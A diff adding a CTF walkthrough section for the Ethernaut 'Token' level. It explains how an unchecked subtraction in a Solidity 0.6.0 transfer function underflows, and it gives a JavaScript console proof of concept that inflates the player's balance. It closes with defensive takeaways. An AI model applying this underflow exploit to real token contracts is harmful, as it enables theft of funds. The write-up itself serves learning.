@@ -240,3 +240,71 @@ Deploy an attacker contract that:
 
 ---
 
+## 🪙 Level 6: Token
+
+### 🎯 Objective
+
+You start with 20 tokens. The goal is to increase your balance beyond the initial amount using the given smart contract.
+
+---
+
+### 🔍 Vulnerability
+
+The `transfer` function has this check:
+
+```solidity
+require(balances[msg.sender] - _value >= 0);
+```
+
+- Since this contract is compiled with Solidity 0.6.0, arithmetic operations do **not** automatically revert on underflow/overflow.
+- If you try to transfer more tokens than you have, `balances[msg.sender] - _value` underflows, wrapping around to a huge number (close to 2^256 - 1).
+- This drastically increases your balance.
+
+---
+
+### 🛠️ Exploit Steps
+
+1. **Deploy the level instance.**
+2. **Call:**
+   ```js
+   await contract.transfer(<victim_address>, 21);
+   ```
+   Here, 21 is more than your balance (20), causing an underflow.
+3. **Your balance will now be a huge number, completing the challenge.**
+
+---
+
+### 🧪 Proof of Concept (JavaScript Console)
+
+```js
+// Check initial balance
+(await contract.balanceOf(player)).toString();
+// > 20
+
+// Exploit: Transfer more than you have
+await contract.transfer("0x0000000000000000000000000000000000000000", 21);
+
+// Check balance again
+(await contract.balanceOf(player)).toString();
+// > Very large number (underflow occurred)
+```
+
+---
+
+### 📝 Key Takeaways
+
+- Before Solidity 0.8.0, arithmetic was unchecked by default, allowing underflows and overflows.
+- Always use SafeMath (or Solidity 0.8+ built-in checks) for safe arithmetic.
+- Never assume `require(x - y >= 0)` will prevent negatives — with unsigned integers, negatives don't exist, they wrap.
+
+---
+
+
+
+
+
+
+
+
+
+
